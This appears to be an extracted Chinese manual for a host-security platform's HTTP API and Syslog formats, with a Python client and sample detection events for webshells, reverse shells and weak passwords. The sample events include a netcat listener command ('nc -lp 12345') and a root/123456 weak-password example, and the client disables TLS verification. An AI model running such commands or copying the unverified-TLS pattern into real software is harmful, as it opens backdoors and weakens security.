@@ -1,0 +1,750 @@
+技术文档 技术文档 2 HTTP API 文档 2 Syslog 文档 13 基线标准文档 37 技术架构 90 入侵场景复现 90 其他技术文档 102 01  / 111
+
+技术文档 技术文档 HTTP API 文档 文档 API Token 使用方式 使用方式 API 说明 所有 HTTP API 均使用 JSONRPC 调用方式，其中：
+请求 请求 URL：  https://{管理平台 IP 地址}/rpc 请求方式 请求方式：  POST
+Content-Type：  application/json;charset=UTF-8
+Body： JSON 格式，其中包含 4 个字段
+id： 必选，字符串，例  63845f41-b556-995a-c6e5
+jsonrpc： 必选，字符串，永远是  "2.0"
+method： 请求方法，必选，字符串，参考不同功能的 API 文档
+params： 请求参数，可选，字典，参考不同功能的 API 文档 Python3 示范调用 封装一个简单的 API 类 将以下代码保存为  API.py  文件 注意，以下代码需要依赖第三方库  requests  ,  cryptography import requests import json from urllib.parse import urljoin import base64 from cryptography.hazmat.primitives import serialization from cryptography.hazmat.primitives.asymmetric import padding from cryptography.hazmat.primitives import hashes class API(object):
+def __init__(self, url):
+self.url = urljoin(url, "/rpc") self.cookies = {}
+
+def login_with_token(self, token):
+self.cookies["API-Token"] = token def get_public_key(self):
+resp = self.request("CloudwalkerSettingService.GetPublicKey", {}, raw_response=True) resp.raise_for_status() 02  / 111
+
+resp.raise_for_status() response_json = resp.json() public_key_base64 = response_json.get( 'result', {}).get('public_key') if not public_key_base64:
+raise ValueError("Public key not found in the API response.") return base64.b64decode(public_key_base64) def encrypt_password(self, passwd, public_key_pem):
+public_key = serialization.load_pem_public_key(public_key_pem) encrypted_passwd = public_key.encrypt( passwd, padding.PKCS1v15()
+
+return base64.b64encode(encrypted_passwd).decode('utf-8') def login_with_password(self, username, password):
+# 获取公钥 public_key_pem = self.get_public_key()
+
+# 加密密码 encrypted_password = self.encrypt_password(password.encode('utf-8'), public_key_pem)
+# 发送带有加密后密码的登录请求 resp = self.request("AccountNoAuthService.Login", {"username": username, "type": "", "credentials": {"password": encrypted_password}}, True) if resp.status_code == 200 and "error" not in resp.json():
+self.cookies["sessionid"] = resp.cookies.get("sessionid", None) def request(self, method, params, raw_response=False):
+data = {
+
+"method": method, "params": params, "jsonrpc": "2.0", "id": "0"  # 使用固定的ID或生成一个随机的ID headers = {
+
+'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json' resp = requests.post(self.url, headers=headers, data=json.dumps(data), cookies=self.cookies, verify= False) if raw_response:
+return resp
+else:
+return resp.json() 这段代码包含一个 API 类，提供了 6 个外部接口：
+# 03  / 111
+
+1. 构造函数 构造函数: 包含 1 个参数，填入管理界面的地址即可
+2. login_with_token: 包含 1 个参数，填入在管理界面上生成的 API Token 即可
+3. get_public_key: 不用传参数，获取服务端的public_key 用来加密用户密码
+4. encrypt_password：包含 2 个参数，分别是加密的公钥名和密码
+5. login_with_password: 包含 2 个参数，分别是用户名和密码
+6. request: 包含 2 个参数，分别为请求方法 (method) 和请求参数 (params)，详见具体的 API 文档
+使用 Token 登录，并使用 API 获取告警配置 from API import API api = API("https://{server_address}/") api.login_with_token("************") result = api.request(
+
+"AlertConfigService.List", {
+
+"count": 20, "offset": 0 print(result) 使用密码登录，并使用 API 获取告警配置 from API import API api = API("https://{server_address}/") api.login_with_password("username", "password") result = api.request(
+
+"AlertConfigService.List", {
+
+"count": 20, "offset": 0 print(result) 入侵检测 入侵检测 入侵检测统计 拉取最新的入侵事件 04  / 111
+
+method：  ThreatOverviewService.ListRealTimeEvents
+params：
+count：必选，数字，代表拉取的事件数量
+data：事件列表，其中每个事件都是一个字典，字段如下
+created_at：事件发现事件
+display_name：事件类型名称
+host_view：事件对应的主机信息
+group_name：业务组名称
+host_comment：主机备注
+host_id：主机 ID
+host_ip：主机 IP
+host_name：主机名
+host_os_name：主机操作系统名称
+host_os_type：主机操作系统类型
+host_state：主机状态
+id：事件 ID
+level：事件风险级别
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+state：事件状态
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+type：事件类型 统计各类事件的数量
+method：  ThreatOverviewService.ListEventTypeDistInfo
+params：
+period：必选，数字，代表统计周期，有三种选项
+7：统计 7 天内的数据
+30：统计 30 天内的数据
+180：统计 180 天内的数据
+level：可选，列表，代表需要筛选的事件等级，有 4 种选项
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+data：内容列表，其中每一类事件都是一个字典，字段如下
+count：事件数量 05  / 111
+
+display_name：事件类型名称
+type：事件类型 统计事件状态与风险等级
+method：  ThreatOverviewService.GetProcessedEventInfo
+params：
+period：必选，数字，代表统计周期，有三种选项
+7：统计 7 天内的数据
+30：统计 30 天内的数据
+180：统计 180 天内的数据
+level：可选，列表，代表需要筛选的事件等级，有 4 种选项
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+data：内容列表，其中每种状态的事件都是一个字典，字段如下
+critical：严重事件数量
+high：高危事件数量
+medium：中危事件数量
+low：低危事件数量
+state：事件状态
+risky：有风险
+ignore：已忽略
+processed：已处理 WebShell
+method：  WebshellEventService.GetEventList
+params：
+count：必选，数字，代表拉取的事件数量
+offset：必选，数字，代表从第几条事件开始拉取
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+state：可选，列表，其中每一项都是一个数字，表示事件状态，可根据事件状态进行筛选
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+path：可选，列表，其中每项都是一个字符串，可根据文件路径进行筛选 06  / 111
+
+events：事件列表，其中每一个事件都是一个字典，字段如下：
+created_at：事件发现事件
+host_view：事件对应的主机信息
+group_name：业务组名称
+host_comment：主机备注
+host_id：主机 ID
+host_ip：主机 IP
+host_name：主机名
+host_os_name：主机操作系统名称
+host_os_type：主机操作系统类型
+host_state：主机状态
+id：事件 ID
+level：事件风险级别
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+state：事件状态
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+path：文件路径 获取事件详情
+method：  WebshellEventService.GetEvent
+params：
+id：必选，数字，事件 ID
+container_hash_id：事件影响的容器 ID，若不在容器内，此项为空
+created_at：事件发现时间
+description：事件说明
+detect_reason：检测依据
+file_size：文件大小
+file_type：文件类型
+group_id：文件所属用户组 ID
+group_name：文件所属用户组名称
+md5：文件 MD5
+path：文件路径
+permission：文件权限
+sha256：文件 sha256
+solution：解决方案
+webshell_type：WebShell 类型 反弹 Shell 07  / 111
+
+method：  RevshellEventService.GetEventList
+params：
+count：必选，数字，代表拉取的事件数量
+offset：必选，数字，代表从第几条事件开始拉取
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+state：可选，列表，其中每一项都是一个数字，表示事件状态，可根据事件状态进行筛选
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+remote_addr：可选，列表，其中每项都是一个字符串，可根据反弹的远程 IP 进行筛选
+events：事件列表，其中每一个事件都是一个字典，字段如下：
+created_at：事件发现事件
+host_view：事件对应的主机信息
+group_name：业务组名称
+host_comment：主机备注
+host_id：主机 ID
+host_ip：主机 IP
+host_name：主机名
+host_os_name：主机操作系统名称
+host_os_type：主机操作系统类型
+host_state：主机状态
+id：事件 ID
+level：事件风险级别
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+state：事件状态
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+remote_addr：反弹的远程 IP
+remote_port：反弹的远程端口 恶意文件
+method：  MalwareEventService.GetEventList
+params：
+count：必选，数字，代表拉取的事件数量 08  / 111
+
+offset：必选，数字，代表从第几条事件开始拉取
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+state：可选，列表，其中每一项都是一个数字，表示事件状态，可根据事件状态进行筛选
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+events：事件列表，其中每一个事件都是一个字典，字段如下：
+created_at：事件发现事件
+host_view：事件对应的主机信息
+group_name：业务组名称
+host_comment：主机备注
+host_id：主机 ID
+host_ip：主机 IP
+host_name：主机名
+host_os_name：主机操作系统名称
+host_os_type：主机操作系统类型
+host_state：主机状态
+id：事件 ID
+level：事件风险级别
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+state：事件状态
+1：代表有风险
+2：代表已处理
+3：代表已忽略 暴力破解
+method：  BruteForceService.GetEventList
+params：
+count：必选，数字，代表拉取的事件数量
+offset：必选，数字，代表从第几条事件开始拉取
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+state：可选，列表，其中每一项都是一个数字，表示事件状态，可根据事件状态进行筛选
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+events：事件列表，其中每一个事件都是一个字典，字段如下：
+# 09  / 111
+
+created_at：事件发现事件
+host_view：事件对应的主机信息
+group_name：业务组名称
+host_comment：主机备注
+host_id：主机 ID
+host_ip：主机 IP
+host_name：主机名
+host_os_name：主机操作系统名称
+host_os_type：主机操作系统类型
+host_state：主机状态
+id：事件 ID
+level：事件风险级别
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+state：事件状态
+1：代表有风险
+2：代表已处理
+3：代表已忽略 蜜罐诱捕
+method：  HoneypotService.GetEventList
+params：
+count：必选，数字，代表拉取的事件数量
+offset：必选，数字，代表从第几条事件开始拉取
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+state：可选，列表，其中每一项都是一个数字，表示事件状态，可根据事件状态进行筛选
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+events：事件列表，其中每一个事件都是一个字典，字段如下：
+created_at：事件发现事件
+host_view：事件对应的主机信息
+group_name：业务组名称
+host_comment：主机备注
+host_id：主机 ID
+host_ip：主机 IP
+host_name：主机名
+host_os_name：主机操作系统名称
+host_os_type：主机操作系统类型 10  / 111
+
+host_state：主机状态
+id：事件 ID
+level：事件风险级别
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+state：事件状态
+1：代表有风险
+2：代表已处理
+3：代表已忽略 本地提权
+method：  ElevationProcessEventService.GetEventList
+params：
+count：必选，数字，代表拉取的事件数量
+offset：必选，数字，代表从第几条事件开始拉取
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+state：可选，列表，其中每一项都是一个数字，表示事件状态，可根据事件状态进行筛选
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+events：事件列表，其中每一个事件都是一个字典，字段如下：
+created_at：事件发现事件
+host_view：事件对应的主机信息
+group_name：业务组名称
+host_comment：主机备注
+host_id：主机 ID
+host_ip：主机 IP
+host_name：主机名
+host_os_name：主机操作系统名称
+host_os_type：主机操作系统类型
+host_state：主机状态
+id：事件 ID
+level：事件风险级别
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+state：事件状态
+1：代表有风险 11  / 111
+
+2：代表已处理
+3：代表已忽略 异常登录
+method：  AbnormalLoginEventService.GetEventList
+params：
+count：必选，数字，代表拉取的事件数量
+offset：必选，数字，代表从第几条事件开始拉取
+gids：可选，列表，其中每一项都是一个数字，表示业务组 ID，可根据业务组进行筛选
+state：可选，列表，其中每一项都是一个数字，表示事件状态，可根据事件状态进行筛选
+1：代表有风险
+2：代表已处理
+3：代表已忽略
+events：事件列表，其中每一个事件都是一个字典，字段如下：
+created_at：事件发现事件
+host_view：事件对应的主机信息
+group_name：业务组名称
+host_comment：主机备注
+host_id：主机 ID
+host_ip：主机 IP
+host_name：主机名
+host_os_name：主机操作系统名称
+host_os_type：主机操作系统类型
+host_state：主机状态
+id：事件 ID
+level：事件风险级别
+1：代表低危事件
+2：代表中危事件
+3：代表高危事件
+4：代表严重事件
+state：事件状态
+1：代表有风险
+2：代表已处理
+3：代表已忽略 文档下载 文档下载 牧云提供多种文档形式，请按需使用:
+swagger openapi.json 在线生成 API docx 文档 12  / 111
+
+其他模块的附加文档:
+计划任务模块参数 Schema 探针策略模块内容 Schema Syslog 文档 文档 SysLog 数据格式文档 数据格式文档2.0 来自产品的事件信息、主机信息 支持多种 rfc 标准和多种格式，支持多种输出形式给出。
+数据格式 输出数据格式支持 json、键值对、结构化数据 json 跟键值对类似，将json字符串存放在message字段中。
+键值对 键值对存放在 message 字段中，需要调用方自己解析 message。Syslog rfc 中并没有定义 message 的数据格式， 即没有说明如何存放键值对这种数据结构，所以我们的做法是将键值对拍平放在 message 中。 对于此种格式的 syslog 的解析，部分接收方强依赖了数据的键值对在message中的顺序，为了保持兼容性， 产品会尽量做到：
+1. 确保已存在的键值对的顺序跟文档中的顺序一致。即：已配置的键值对的顺序不会变。
+2. 新增键值对时，新增的键值对需要放在最后，不影响已配置的键值对的顺序。
+结构化数据 数据存放在结构化数据(STRUCTURED-DATA)中，推荐使用。rfc-5424 原生提供了结构化数据，适合存放键值(结 构化)数据。不同维度的数据，在结构化数据中，以不同的 SD—ELEMENT 存放。
+事件类型 共分三个数据来源（审计日志、入侵检测、风险感知）用户可自主勾选 每个模块都有唯一的MsgId来标识 审计日志 审计日志 cloudwalker-auditlog 风险感知 13  / 111
+
+重点漏洞 cloudwalker-focus-vuln 通用漏洞 cloudwalker-vuln 敏感端口 cloudwalker-sensitive-port 敏感文件 cloudwalker-sensitive-file 弱口令 cloudwalker-weakpassword 入侵检测 Webshell cloudwalker-webshell 反弹 Shell cloudwalker-revshell 可疑命令 cloudwalker-suspicious-command 恶意文件 cloudwalker-malware 暴力破解 cloudwalker-brute-force 蜜罐诱捕 cloudwalker-honeypot 本地提权 cloudwalker-elevation-process 异常登录 cloudwalker-abnormal-login 命令审计 cloudwalker-full-command 网络异常 cloudwalker-abnormal-network 事件详情 通用漏洞（cloudwalker-vuln） 14  / 111
+
+vuln_name string 漏洞名称 IBM WAS 安全漏洞 vuln_level int 漏洞等级 4 vuln_cvss_score float 漏洞CVSS分数 4.6 vuln_cvss_access_vector string 漏洞CVSS攻击 向量 NETWORK vuln_cvss_access_complexity string 漏洞CVSS攻击 复杂度 HIGH vuln_cvss_authentication string 漏洞CVSS攻击 认证 SINGLE vuln_cvss_confidentiality_impact string 漏洞CVSS机密 vuln_cvss_integrity_impact string 漏洞CVSS完整 vuln_cvss_availability_impact string 漏洞CVSS可用 vuln_access_info string 漏洞评估信息 [{"link": "https://www.exploit- db.com/exploits/41995"}] vuln_publish_date string 漏洞公布日期 2020-05-25 06:44:47 vuln_modify_date string 漏洞修改日期 2020-05-25 06:44:47 vuln_cnnvd string 漏洞CNNVD编号 CNNVD-201709-399 vuln_type string 漏洞类型 安全特征问题 vuln_cnvd string 漏洞CNVD编号 CNVD-2017-30116 vuln_cwe string 漏洞CWE编号 CWE-119 vuln_cve string 漏洞CVE编号 CVE-2017-14287 vuln_bid string 漏洞BID编号 12 15  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-vuln {"host_name": "Bomb", "host_ip": " 10.2.6.83", "host_id": "190", "vuln_name": "IBM WAS 安全漏洞", "vuln_level": "4", "vuln_cvss_score": "4.6", "v uln_cvss_access_vector": "NETWORK", "vuln_cvss_access_complexity": "HIGH", "vuln_cvss_authentication" : "SINGLE", "vuln_cvss_confidentiality_impact": "COMPLETE", "vuln_cvss_integrity_impact": "COMPLETE", " vuln_cvss_availability_impact": "COMPLETE", "vuln_access_info": "", "vuln_publish_date": "2020-05-25 06:44 :47", "vuln_modify_date": "2020-05-25 06:44:47", "vuln_cnnvd": "CNNVD-201709-399", "vuln_type": "安全特 征问题", "vuln_cnvd": "CNVD-2017-30116", "vuln_cwe": "CWE-119", "vuln_cve": "CVE-2017-14287", "vuln_bi d": "12", "event_description": "", "event_solution": ""} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-vuln  host_name="Bomb" host_ip="10.2 .6.83" host_id="190" vuln_name="IBM WAS 安全漏洞" vuln_level="4" vuln_cvss_score="4.6" vuln_cvss_access_ vector="NETWORK" vuln_cvss_access_complexity="HIGH" vuln_cvss_authentication="SINGLE" vuln_cvss_confi dentiality_impact="COMPLETE" vuln_cvss_integrity_impact="COMPLETE" vuln_cvss_availability_impact="COM PLETE" vuln_access_info="www.exploit-db.com" vuln_publish_date="2020-05-25 06:44:47" vuln_modify_date=" 2020-05-25 06:44:47" vuln_cnnvd="CNNVD-201709-399" vuln_type="安全特征问题" vuln_cnvd="CNVD-2017- 30116" vuln_cwe="CWE-119" vuln_cve="CVE-2017-14287" vuln_bid="12" event_description="" event_solution=" " <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-vuln [host-info  host_name="Bomb" host _ip="10.2.6.83" host_id="190"][vuln vuln_name="IBM WAS 安全漏洞" vuln_level="4" vuln_cvss_score="4.6" vuln _cvss_access_vector="NETWORK" vuln_cvss_access_complexity="HIGH" vuln_cvss_authentication="SINGLE" v uln_cvss_confidentiality_impact="COMPLETE" vuln_cvss_integrity_impact="COMPLETE" vuln_cvss_availability_i mpact="COMPLETE" vuln_access_info="" vuln_publish_date="2020-05-25 06:44:47" vuln_modify_date="2020-0 5-25 06:44:47" vuln_cnnvd="CNNVD-201709-399" vuln_type="安全特征问题" vuln_cnvd="CNVD-2017-30116" vuln_cwe="CWE-119" vuln_cve="CVE-2017-14287" vuln_bid="12" event_description="" event_solution=""] 重点漏洞（cloudwalker-focus-vuln） 16  / 111
+
+event_level string 事件等级 nil / low / medium / high / critical event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 vuln_cvss_score float 漏洞CVSS分数 4.6 vuln_cvss_access_vector string 漏洞CVSS攻击向量 NETWORK vuln_cvss_access_complexity string 漏洞CVSS攻击复杂度 HIGH vuln_cvss_authentication string 漏洞CVSS攻击认证 SINGLE vuln_cvss_confidentiality_impact string 漏洞CVSS机密性影响 COMPLETE vuln_cvss_integrity_impact string 漏洞CVSS完整性影响 COMPLETE vuln_cvss_availability_impact string 漏洞CVSS可用性影响 COMPLETE vuln_type string 漏洞类型 安全特征问题 vuln_cwe string 漏洞CWE编号 CWE-119 vuln_cve_list List 漏洞编号组 [{CVE-2020-4450}] vuln_app List 漏洞应用名称 vuln_affected_versions List 漏洞影响版本 {1.2.4} vuln_reference List 漏洞引用信息 reference_url <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-focus-vuln {"host_name": "Bomb", "host _ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "critical", "event_create_time": "2 022-01-11 11:19:26", "vuln_cvss_score": "4.6", "vuln_cvss_access_vector": "NETWORK", "vuln_cvss_access _complexity": "HIGH", "vuln_cvss_authentication": "SINGLE", "vuln_cvss_confidentiality_impact": "COMPLET E", "vuln_cvss_integrity_impact": "COMPLETE", "vuln_cvss_availability_impact": "COMPLETE", "vuln_type": " 安全特征问题", "vuln_cwe": "CWE-119", "vuln_cve_list": "[{CVE-2020-4450}]", "vuln_app": "", "vuln_affected_v ersions": "{1.2.4}", "vuln_reference": "https://exchange.xforce.ibmcloud.com/vulnerabilities/181231", "event_d escription": "", "event_solution": ""} 17  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-focus-vuln  host_name="Bomb" host_ip= "10.2.6.83" host_id="190" event_name="WebShell" event_level="critical" event_create_time="2022-01-11 11:19:
+26" vuln_cvss_score="4.6" vuln_cvss_access_vector="NETWORK" vuln_cvss_access_complexity="HIGH" vuln_c vss_authentication="SINGLE" vuln_cvss_confidentiality_impact="COMPLETE" vuln_cvss_integrity_impact="COM PLETE" vuln_cvss_availability_impact="COMPLETE" vuln_type="安全特征问题" vuln_cwe="CWE-119" vuln_cve _list="[{CVE-2020-4450}]" vuln_app="" vuln_affected_versions="{1.2.4}" vuln_reference="https://exchange.xforce .ibmcloud.com/vulnerabilities/181231" event_description="" event_solution="" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-focus-vuln [host-info  host_name="Bomb " host_ip="10.2.6.83" host_id="190"][focus-vuln event_name="WebShell" event_level="critical" event_create_time ="2022-01-11 11:19:26" vuln_cvss_score="4.6" vuln_cvss_access_vector="NETWORK" vuln_cvss_access_com plexity="HIGH" vuln_cvss_authentication="SINGLE" vuln_cvss_confidentiality_impact="COMPLETE" vuln_cvss_in tegrity_impact="COMPLETE" vuln_cvss_availability_impact="COMPLETE" vuln_type="安全特征问题" vuln_cwe= "CWE-119" vuln_cve_list="[{CVE-2020-4450}]" vuln_app="" vuln_affected_versions="{1.2.4}" vuln_reference="htt
+ps://exchange.xforce.ibmcloud.com/vulnerabilities/181231" event_description="" event_solution=""] 弱口令（cloudwalker-weakpassword） event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 service_name string 服务名 user_password string 用户密码（弱口令） 123456 18  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-weakpassword {"host_name": "Bomb", "host_ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "critical", "event_state": "ign ored", "event_create_time": "2022-01-11 11:19:26", "service_name": "", "user_name": "root", "user_password" : "123456", "event_description": "", "event_solution": ""} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-weakpassword  host_name="Bomb" hos t_ip="10.2.6.83" host_id="190" event_name="WebShell" event_level="high" event_state="ignored" event_create_ time="2022-01-11 11:19:26" service_name="" user_name="root" user_password="123456" event_description="" event_solution="" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-weakpassword [host-info  host_name="B omb" host_ip="10.2.6.83" host_id="190"][weakpassword event_name="WebShell" event_level="high" event_state ="processed" event_create_time="2022-01-11 11:19:26" service_name="" user_name="root" user_password="1 23456" event_description="" event_solution=""] 敏感端口（cloudwalker-sensitive-port） event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 protocol string 协议 tcp process_port int 进程本地端口 3306 source_ip string 本地ip 10.9.32.227 process_command_line string 进程命令行 nc -lp 12345 local_port_state string 本地端口状态 nil / risky / ignored / processed 19  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-sensitive-port {"host_name": "Bomb", "h ost_ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "high", "event_state": "risky", " event_create_time": "2022-01-11 11:19:26", "protocol": "tcp", "process_port": "3306", "source_ip": "10.9.32.22 7", "process_id": "12", "process_command_line": "nc -lp 12345", "local_port_state": "processed", "event_descr iption": "", "event_solution": ""} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-sensitive-port  host_name="Bomb" host _ip="10.2.6.83" host_id="190" event_name="WebShell" event_level="low" event_state="risky" event_create_time ="2022-01-11 11:19:26" protocol="tcp" process_port="3306" source_ip="10.9.32.227" process_id="12" process_ command_line="nc -lp 12345" local_port_state="processed" event_description="" event_solution="" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-sensitive-port [host-info  host_name="Bo mb" host_ip="10.2.6.83" host_id="190"][sensitive-port event_name="WebShell" event_level="high" event_state=" processed" event_create_time="2022-01-11 11:19:26" protocol="tcp" process_port="3306" source_ip="10.9.32.2 27" process_id="12" process_command_line="nc -lp 12345" local_port_state="processed" event_description="" e vent_solution=""] 敏感文件（cloudwalker-sensitive-file） 20  / 111
+
+event_state string 事件状态 risky / ignored / processed file_action string 文件行为 file_owner string 文件所有者 root file_group string 文件所有组 root file_modified_time timestamp 文件内容修改时间 2022-01-11 11:19:26 file_attr_modified_time timestamp 文件属性修改时间 2022-01-11 11:19:26 file_access_time timestamp 文件最近访问时间 2022-01-11 11:19:26 <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-sensitive-file {"host_name": "Bomb", "h ost_ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_state": "risky", "file_path": "", "file_acti on": "", "file_owner": "root", "user_id": "0", "file_group": "root", "user_gid": "0", "file_size": "67816", "file_permissi on": "-rwxr-xr-x", "file_modified_time": "2022-01-11 11:19:26", "file_attr_modified_time": "2022-01-11 11:19:26 ", "file_access_time": "2022-01-11 11:19:26"} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-sensitive-file  host_name="Bomb" host_i p="10.2.6.83" host_id="190" event_name="WebShell" event_state="processed" file_path="" file_action="" file_ow ner="root" user_id="0" file_group="root" user_gid="0" file_size="67816" file_permission="-rwxr-xr-x" file_modified_t ime="2022-01-11 11:19:26" file_attr_modified_time="2022-01-11 11:19:26" file_access_time="2022-01-11 11:1
+9:26" 21  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-sensitive-file [host-info  host_name="Bo mb" host_ip="10.2.6.83" host_id="190"][sensitive-file event_name="WebShell" event_state="processed" file_path ="" file_action="" file_owner="root" user_id="0" file_group="root" user_gid="0" file_size="67816" file_permission="- rwxr-xr-x" file_modified_time="2022-01-11 11:19:26" file_attr_modified_time="2022-01-11 11:19:26" file_access _time="2022-01-11 11:19:26"] WebShell（cloudwalker-webshell） event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 domains string 域名 ["localhost"] file_type string 文件类型 text/x-php event_type string 事件类型 异常 IP外连 file_md5 string 文件MD5 4df2702d5b36e6674b012d999419c091 file_group string 文件所有组 root file_owner string 文件所有者 root file_create_time timestamp 文件创建时间 2022-01-11 11:19:26 file_access_time timestamp 文件最近访问时间 2022-01-11 11:19:26 file_modified_time timestamp 文件内容修改时间 2022-01-11 11:19:26 22  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-webshell {"host_name": "Bomb", "host_ ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "medium", "event_state": "process ed", "event_create_time": "2022-01-11 11:19:26", "domains": "[\"localhost\"]", "file_type": "x-php", "event_type" : "异常IP外连", "file_permission": "-rwxr-xr-x", "file_path": "", "file_md5": "4df2702d5b36e6674b012d999419c0 91", "file_group": "root", "file_owner": "root", "file_size": "67816", "file_create_time": "2022-01-11 11:19:26", "fil e_access_time": "2022-01-11 11:19:26", "file_modified_time": "2022-01-11 11:19:26", "event_description": "", "event_solution": ""} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-webshell  host_name="Bomb" host_ip=" 10.2.6.83" host_id="190" event_name="WebShell" event_level="nil" event_state="processed" event_create_time= "2022-01-11 11:19:26" domains="[\"localhost\"]" file_type="x-php" event_type="异常IP外连" file_permission="-rw xr-xr-x" file_path="" file_md5="4df2702d5b36e6674b012d999419c091" file_group="root" file_owner="root" file_s ize="67816" file_create_time="2022-01-11 11:19:26" file_access_time="2022-01-11 11:19:26" file_modified_time ="2022-01-11 11:19:26" event_description="" event_solution="" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-webshell [host-info  host_name="Bomb" host_ip="10.2.6.83" host_id="190"][webshell event_name="WebShell" event_level="high" event_state="risky" eve nt_create_time="2022-01-11 11:19:26" domains="[\"localhost\"]" file_type="text" event_type="异常IP外连" file_pe rmission="-rwxr-xr-x" file_path="" file_md5="4df2702d5b36e6674b012d999419c091" file_group="root" file_owne r="root" file_size="67816" file_create_time="2022-01-11 11:19:26" file_access_time="2022-01-11 11:19:26" file_ modified_time="2022-01-11 11:19:26" event_description="" event_solution=""] 反弹Shell（cloudwalker-revshell） 23  / 111
+
+event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed source_ip string 本地ip 10.9.32.227 source_port int 本地端口 39794 target_ip string 远程ip 10.9.32.227 target_port int 远程端口 33211 protocol string 协议 tcp parent_process_pid string 父进程pid 4111388 process_command_line string 进程命令行 nc -lp 12345 parent_process_cmdline string 父进程命令行 bash parent_process_path string 父进程路径 bash event_start_time timestamp 事件开始时间 2022-01-11 11:19:26 <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-revshell {"host_name": "Bomb", "host_i p": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "high", "event_state": "risky", "sourc e_ip": "10.9.32.227", "source_port": "39794", "target_ip": "10.9.32.227", "target_port": "33211", "protocol": "tcp ", "process_id": "12", "parent_process_pid": "4111388", "process_command_line": "nc -lp 12345", "parent_pro cess_cmdline": "bash", "process_path": "usr", "parent_process_path": "bash", "event_start_time": "2022-01-11
+11:19:26", "event_description": "", "event_solution": ""} 24  / 111
+
